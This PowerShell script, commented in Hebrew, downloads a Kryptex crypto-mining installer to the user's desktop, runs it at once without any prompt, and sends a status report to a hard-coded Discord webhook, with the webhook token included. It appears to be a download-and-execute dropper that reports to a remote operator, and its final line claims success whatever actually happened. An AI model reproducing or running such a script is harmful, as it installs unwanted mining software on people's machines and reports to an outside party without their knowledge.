# URL של הקובץ להורדה
$url = "https://9a7f6a3c-8431-438c-89d9-90924a59e618.akamaized.net/installer/4.41.1/kryptex-setup-4.41.1.exe"

# שם הקובץ המורד
$filename = [System.IO.Path]::GetFileName($url)

# מיקום שולחן העבודה עבור המשתמש הנוכחי ב-Windows
$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), $filename)

# הורדת הקובץ
try {
    Invoke-WebRequest -Uri $url -OutFile $desktopPath
    $downloadStatus = "הקובץ $filename הורד בהצלחה."
} catch {
    $downloadStatus = "הקובץ $filename לא הורד בהצלחה: $_"
}

# פתיחת הקובץ שהורד
try {
    Start-Process $desktopPath
    $openStatus = "הקובץ $filename נפתח בהצלחה."
} catch {
    $openStatus = "הקובץ $filename לא נפתח בהצלחה: $_"
}

# URL של ה-Webhook ב-Discord
$discordWebhookUrl = "https://discord.com/api/webhooks/1269621110060744736/aeJeJS49mUpjFtXzpS8ux_tgHyh7F4AHfi4SHQ-Q5hdGTs-0fGPiBiMuN0B8hqfuq_b-"

# יצירת הודעת הלוגים
$logMessage = @{
    content = $null
    embeds = @(
        @{
            title = "דוח הורדה ופתיחה"
            description = "$downloadStatus`n$openStatus"
            color = 5814783
        }
    )
} | ConvertTo-Json

# שליחת ההודעה ל-Discord Webhook
try {
    Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -Body $logMessage -ContentType "application/json"
} catch {
    Write-Error "לא ניתן היה לשלוח את ההודעה ל-Discord Webhook: $_"
}

# הצגת הודעה שהקובץ הורד, הותקן ונפתח בהצלחה
Write-Output "הקובץ $filename הורד, הותקן ונפתח בהצלחה בשולחן העבודה."
